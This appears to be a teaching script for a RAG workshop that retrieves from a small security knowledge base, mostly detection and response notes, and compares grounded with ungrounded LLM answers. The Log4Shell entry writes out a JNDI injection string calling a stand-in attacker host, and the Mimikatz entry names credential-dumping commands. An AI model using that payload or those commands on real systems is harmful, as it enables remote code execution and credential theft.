# Exercise 3 — The Full RAG Pipeline
#
# Combines embedding-based retrieval with LLM generation to answer
# security questions grounded in a knowledge base. Compares pure LLM
# output against RAG-augmented output and tests out-of-scope handling.
#
# Requires: pip install sentence-transformers
# Requires at least one API key:
#   set ANTHROPIC_API_KEY=...
#   set OPENAI_API_KEY=...
#   set GOOGLE_API_KEY=...
#   set OLLAMA_MODEL=huihui_ai/qwen3.5-abliterated:2B

import re
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer
import sys
import os

# Import the shared LLM client (one directory up from )
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from llm_client import get_client

# Load embedding model (for retrieval) and LLM client (for generation)
embed_model = SentenceTransformer("all-MiniLM-L6-v2")

provider, llm_client = get_client()
if llm_client is None:
    print("No API key found. Set ANTHROPIC_API_KEY, OPENAI_API_KEY, or GOOGLE_API_KEY.")
    print("(Task 1 — building the augmented prompt — still works without an API key.)")

print(f"Embedding model: all-MiniLM-L6-v2")
if llm_client:
    print(f"LLM provider: {provider}")


# ============================================================
#   Knowledge Base
# ============================================================

KNOWLEDGE_BASE = {
    "mimikatz": """
Mimikatz is a credential dumping tool that extracts plaintext passwords and NTLM hashes
from Windows LSASS memory. It was created by Benjamin Delpy and is used by both red teams
and threat actors. Common techniques include sekurlsa::logonpasswords for plaintext creds,
lsadump::dcsync for domain replication, and kerberos::golden for Golden Ticket attacks.

Detection relies on monitoring LSASS memory access by non-system processes using Sysmon
Event ID 10. Unexpected access to lsass.exe from tools like procdump, taskmgr, or
unsigned binaries should trigger high-severity alerts.

Mitigations include enabling Windows Credential Guard, disabling WDigest authentication,
placing high-value accounts in the Protected Users group, and enabling LSA Protection.
For active directory environments, enable audit policies for privilege use and account
management, and baseline normal dcsync behaviour to detect unauthorized replication.
""",
    "log4shell": """
CVE-2021-44228 Log4Shell is a critical RCE vulnerability in Apache Log4j2 versions 2.0-beta9 through 2.14.1.
Attack vector: inject ${jndi:ldap://attacker.com/x} into any logged HTTP field.
Exploitable via User-Agent, X-Forwarded-For, or any parameter that gets logged.
No authentication required; CVSS score 10.0.
Remediation: upgrade to Log4j 2.17.1 or later.
Mitigation: set -Dlog4j2.formatMsgNoLookups=true.
Detection: outbound LDAP from application servers; jndi patterns in web access logs.
""",
    "ransomware": """
Ransomware incident response: Phase 1 (0-30 min) confirm indicators and identify Patient Zero.
Do NOT reboot infected machines — memory forensics may be needed.
Phase 2 (30 min to 2 hr): isolate via VLAN not shutdown, disable compromised accounts, block C2 at perimeter.
Phase 3 (2-24 hr): remove persistence mechanisms, reset all credentials, patch initial access vector.
Phase 4 (1-7 days): restore from clean backups, prioritise critical systems, monitor for re-infection.
Phase 5: root cause analysis, update detection rules, test backup integrity.
""",
    "lateral_movement": """
Lateral movement allows attackers to progressively move through a network after initial compromise.
Detect via SMB authentication anomalies (Event ID 4624 type 3), unusual RDP connections.
PsExec and WMI remote execution are common lateral movement tools; monitor process creation.
Pass-the-Hash attacks reuse NTLM hashes without knowing plaintext passwords.
Baseline normal admin behaviour to distinguish legitimate from malicious activity.
Alert on admin tools appearing on non-admin workstations.
""",
    "phishing": """
Phishing emails impersonate trusted entities to steal credentials or deliver malware.
Identify phishing by checking SPF, DKIM, and DMARC alignment in email headers.
Inspect sender domain age and URL redirect chains for suspicious redirects.
Hash attachments and check against VirusTotal; sandbox unknown executables.
Spear-phishing targets specific individuals using OSINT from LinkedIn and social media.
Business Email Compromise (BEC) uses lookalike domains and urgency to bypass scrutiny.
""",
    "network_segmentation": """
Network segmentation limits lateral movement by dividing infrastructure into isolated zones.
DMZ hosts internet-facing services; separate VLAN for OT and ICS systems; isolated network for domain controllers.
Zero-trust architecture verifies every request and assumes breach at all times.
Microsegmentation uses host-based firewall rules to restrict east-west traffic.
VLAN-based segmentation is fast to implement; SDN-based microsegmentation scales better.
Document all segment boundaries and authorised communication paths in a network diagram.
""",
}

QUESTIONS = [
    "What Sysmon event ID should I monitor for credential dumping attacks?",
    "What are the first steps when ransomware is detected in my environment?",
    "How can I prevent lateral movement between network segments?",
]


# ============================================================
#   Index-building and retrieval helpers
# ============================================================

def build_index(kb):
    """Chunk all documents and encode into a vector index."""
    all_chunks = []
    for doc_id, text in kb.items():
        words = text.split()
        step = 50
        for i in range(0, len(words), step):
            chunk = " ".join(words[i:i + 60])
            if len(chunk.split()) >= 10:
                all_chunks.append((doc_id, chunk))
    texts = [c[1] for c in all_chunks]
    idx = embed_model.encode(texts)
    return all_chunks, idx


def retrieve(query, all_chunks, index, top_k=3):
    """Encode query and return top-k most similar chunks."""
    q = embed_model.encode([query])
    sims = cosine_similarity(q, index)[0]
    top = np.argsort(sims)[::-1][:top_k]
    return [(float(sims[i]), all_chunks[i][0], all_chunks[i][1]) for i in top]


# Build the index once at startup
all_chunks, index = build_index(KNOWLEDGE_BASE)
print(f"Index built: {len(all_chunks)} chunks from {len(KNOWLEDGE_BASE)} documents\n")


# ============================================================
#   TASK 1: Build the augmented prompt
# ============================================================
print("=" * 60)
print("  TASK 1: Build the Augmented Prompt")
print("=" * 60)

# Retrieves top-k chunks and formats them into a system prompt
# with instructions to answer ONLY from the provided context.
def build_rag_prompt(query, top_k=3):
    results = retrieve(query, all_chunks, index, top_k=top_k)
    context = "\n\n".join(
        [f"[Source: {doc_id}]\n{chunk}" for score, doc_id, chunk in results]
    )
    return (
        "You are a security analyst assistant.\n"
        "Answer the user's question using ONLY the information in the context below.\n"
        "If the answer is not in the context, say 'I don't have that information in my knowledge base.'\n"
        "Always cite which [Source: ...] you used.\n\n"
        f"CONTEXT:\n{context}"
    )

print("\n=== Augmented prompt for question 1 ===")
print(build_rag_prompt(QUESTIONS[0]))


# ============================================================
#   TASK 2: Compare pure LLM vs RAG
# ============================================================
print("\n" + "=" * 60)
print("  TASK 2: Pure LLM vs RAG")
print("=" * 60)

# Same question sent with and without retrieved context.
# The RAG response should specifically mention "Sysmon Event ID 10".
if llm_client:
    print("\n=== Pure LLM (no context) ===")
    pure_resp = llm_client.chat(
        system="You are a security analyst assistant.",
        messages=[{"role": "user", "content": QUESTIONS[0]}],
        max_tokens=200,
    )
    print(pure_resp)

    print("\n=== RAG answer (with retrieved context) ===")
    rag_system = build_rag_prompt(QUESTIONS[0])
    rag_resp = llm_client.chat(
        system=rag_system,
        messages=[{"role": "user", "content": QUESTIONS[0]}],
        max_tokens=200,
    )
    print(rag_resp)
else:
    print("(Skipping Task 2 — no API key found)")


# ============================================================
#   TASK 3: Three-question Q&A session
# ============================================================
print("\n" + "=" * 60)
print("  TASK 3: 3-Question Q&A Session")
print("=" * 60)

# Runs all three questions through the full RAG pipeline.
# For each question, shows the retrieved sources and the answer.
if llm_client:
    print("\n=== 3-Question Q&A Session ===\n")
    for question in QUESTIONS:
        results = retrieve(question, all_chunks, index, top_k=3)
        sources = ", ".join(f"{doc_id} ({score:.2f})" for score, doc_id, _ in results)
        rag_system = build_rag_prompt(question, top_k=3)
        answer = llm_client.chat(
            system=rag_system,
            messages=[{"role": "user", "content": question}],
            max_tokens=250,
        )
        print(f"Q: {question}")
        print(f"Retrieved: {sources}")
        print(f"A: {answer}\n")
else:
    print("(Skipping Task 3 — no API key found)")


# ============================================================
#   TASK 4 (Bonus): Out-of-scope question
# ============================================================
print("=" * 60)
print("  TASK 4 (Bonus): Out-of-Scope Question")
print("=" * 60)

# When the knowledge base has no relevant info, the RAG system
# should refuse to answer rather than hallucinate.
if llm_client:
    OUT_OF_SCOPE = "What is the best antivirus software to buy in 2024?"
    print(f"\nQuery: {OUT_OF_SCOPE}")
    results = retrieve(OUT_OF_SCOPE, all_chunks, index, top_k=3)
    print("Retrieved chunks (low relevance expected):")
    for score, doc_id, chunk in results:
        print(f"  {score:.4f} | {doc_id} | {chunk[:60]}...")
    rag_system = build_rag_prompt(OUT_OF_SCOPE, top_k=3)
    answer = llm_client.chat(
        system=rag_system,
        messages=[{"role": "user", "content": OUT_OF_SCOPE}],
        max_tokens=150,
    )
    print(f"\nRAG answer: {answer}")

print("\n--- Exercise 3 complete. RAG workshop finished! ---")
print("--- Open reference_solution.py to compare your implementation. ---")
